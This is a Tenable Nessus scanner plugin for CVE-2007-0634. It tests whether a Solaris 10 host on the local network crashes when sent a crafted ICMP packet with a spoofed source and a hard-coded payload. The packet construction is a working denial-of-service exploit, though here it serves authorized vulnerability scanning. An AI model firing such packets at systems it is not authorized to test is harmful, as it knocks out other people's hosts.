#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(29980);
  script_version("$Revision: 1.14 $");
  script_cvs_date("$Date: 2016/05/12 14:55:05 $");

  script_cve_id("CVE-2007-0634");
  script_bugtraq_id(22323);
  script_osvdb_id(31878);
  script_xref(name:"CERT", value:"967236");

  script_name(english:"Solaris 10 ICMP Packet Handling DoS");
  script_summary(english:"Sends a malicious ICMP packet");

  script_set_attribute(attribute:"synopsis", value:"The remote host is prone to a denial of service attack.");
  script_set_attribute(attribute:"description", value:
"The remote host appears to be running a version of Solaris 10 that
contains a vulnerability in its ICMP handling process that can be
leveraged by an unauthenticated remote attacker to panic the affected
host.");
  script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/fulldisclosure/2008-01/0164.html");
  script_set_attribute(attribute:"see_also", value:"http://sunsolve.sun.com/search/document.do?assetkey=1-26-102697-1");
  script_set_attribute(attribute:"solution", value:"Apply the appropriate patch as described in the vendor advisory above.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2007/01/30");
  script_set_attribute(attribute:"plugin_publication_date", value:"2008/01/15");

  script_set_attribute(attribute:"potential_vulnerability", value:"true");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_category(ACT_KILL_HOST);
  script_family(english:"Denial of Service");

  script_copyright(english:"This script is Copyright (C) 2008-2016 Tenable Network Security, Inc.");

  script_dependencies("os_fingerprint.nasl");
  script_require_keys("Settings/ParanoidReport");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);
if (islocalhost()) exit(0);
if (!islocalnet()) exit(0);


os = get_kb_item("Host/OS");
if (!os || "Solaris 10" >!< os) exit(0);


# Construct a malicious ICMP packet.
data = raw_string(
  0x60, 0xaa, 0x76, 0xc1, 0xec, 0xa7, 0x7d, 0xfa,
  0x8a, 0x72, 0x8e, 0xc6, 0xe3, 0xd2, 0x64, 0x13,
  0xE7, 0x4d, 0xbc, 0x01, 0x40, 0x5b, 0x8e, 0x8b,
  0xe5, 0xee, 0x5e, 0x37, 0xdd, 0xc2, 0x54, 0x8e,
  0x8d, 0xce, 0x0c, 0x42, 0x97, 0xa1, 0x8c, 0x04,
  0x8a, 0xc2, 0x6b, 0xae, 0xe9, 0x2e, 0xfe, 0xd4,
  0x4b
);
src = "224.90.115.18";

ip = forge_ip_packet(
  ip_v   : 4,
  ip_hl  : 5,
  ip_tos : 0xff,
  ip_off : 0,
  ip_len : 77,
  ip_p   : IPPROTO_ICMP,
  ip_id  : rand() % 0xffff,
  ip_ttl : 0x40,
  ip_src : src
);
boom = forge_icmp_packet(
  ip        : ip,
  icmp_type : 8,
  icmp_code : 222,
  icmp_seq  : rand() % 0xffff,
  icmp_id   : rand() % 0xffff,
  data      : data
);


# Send packet and check whether the host is down.
start_denial();
send_packet(boom, pcap_active:FALSE);
alive = end_denial();
if (!alive)
{
  set_kb_item(name:"Host/dead", value:TRUE);
  security_hole(0);
}
